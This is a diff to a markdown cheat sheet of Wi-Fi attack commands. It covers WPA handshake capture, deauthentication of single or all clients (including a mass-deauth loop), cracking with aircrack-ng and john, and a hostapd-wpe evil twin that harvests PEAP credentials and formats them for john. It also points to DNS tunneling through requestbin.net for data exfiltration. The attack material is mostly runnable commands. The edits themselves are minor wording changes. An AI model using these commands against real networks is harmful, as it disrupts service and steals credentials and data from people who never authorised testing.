@@ -2,7 +2,8 @@
 
 ## **WPA**
 
-Capture Handshake using airodump-ng + local crack using john or hashcat =&gt; cleartext password
+1. Capture Handshake using airodump-ng 
+2. Crack it locally using john or hashcat
 
 ### 1. Monitor mode
 
@@ -19,34 +20,32 @@ sudo airodump-ng -a mon0
 > find you target bssid \(mac\) and chanel
 
 ```sh
-airodump-ng -c 6 --bssid <MAC-BOX-CLIENT> --showack -w capture mon0
+airodump-ng -c <channel> --bssid <MAC-BOX-CLIENT> --showack -w capture mon0
 ```
 
-> don't forget the -w paramter to save the handshake !!
+> don't forget the -w paramter to save the handshake !
 
 ### 3. DeAUTH
 
 ```sh
-aireplay-ng mon0 -0 5 -b <MAC-BOX-CLIENT>
-```
+# DEAUTH all clients from a box
+aireplay-ng mon0 -0 5 -b <MAC-BOX>
 
-DEAUTH specific client device
+# DEAUTH specific client device
+aireplay-ng mon0 -0 5 -a <MAC-BOX> -c <MAC-DEVICE-CLIENT> 
 
-```sh
-aireplay-ng -0 5 -a <MAC-BOX-CLIENT> -c <MAC-DEVICE-CLIENT> mon0
-```
 
-DEAUTH massif \(each client connected at each bssid of an essid\)
-
-```sh
+# DEAUTH massif (each client connected at each bssid of an essid)
 for bssid in cat bssid_deauth.lst; do for mac in cat client_deauth.lst; do aireplay-ng mon.wlan0 -0 5 -a $bssid -c $mac --ignore-negative-one -e <ESSID_CLIENT> ; done ; done
+
 ```
 
 ### 4. Handshake cracking
 
-Handshaked captured ? go crack it !!
+Handshaked captured ? go crack it !
 
-**Crack with aircrack**
+Crack with aircrack
+
 ```sh
 aircrack-ng capture-01.cap --wordlist=<wordlist>
 ```
@@ -62,13 +61,15 @@ john --wordlist=<wordlist> capture.cap-01.hccap.john
 
 Crack with hashcat
 
-_**todo**_
+```sh
+todo
+```
 
 ---
 
 ## **PEAP**
 
-1. `apt install hostapd-wpe`
+1. `sudo apt install hostapd-wpe`
 2. Configure same channel and essid than the client's one in hostapd conf
 3. Disconnect clients devices \(see WPA - 3. DeAUTH\)
 
@@ -78,7 +79,7 @@ Log PEAP : hash client format john
 cat peap_client_log.txt | grep username -A2 | sed '/^--/d' | awk '{print $2}' | tr -d ':' | awk 'NR%3{printf $0":";next;}1' | awk -F ':' '{print $1"::::"$3":"$2}'
 ```
 
-*Vulnerability fix : GPO validate certificate*
+> Vulnerability fix : GPO validate certificate
 
 ---
 
@@ -88,7 +89,7 @@ cat peap_client_log.txt | grep username -A2 | sed '/^--/d' | awk '{print $2}' | 
 
 Try DNS tunneling to exfiltrate data over the internet
 
-[http://requestbin.net/dns](http://requestbin.net/dns)
+- [http://requestbin.net/dns](http://requestbin.net/dns)
 
 ## Troubleshooting
 
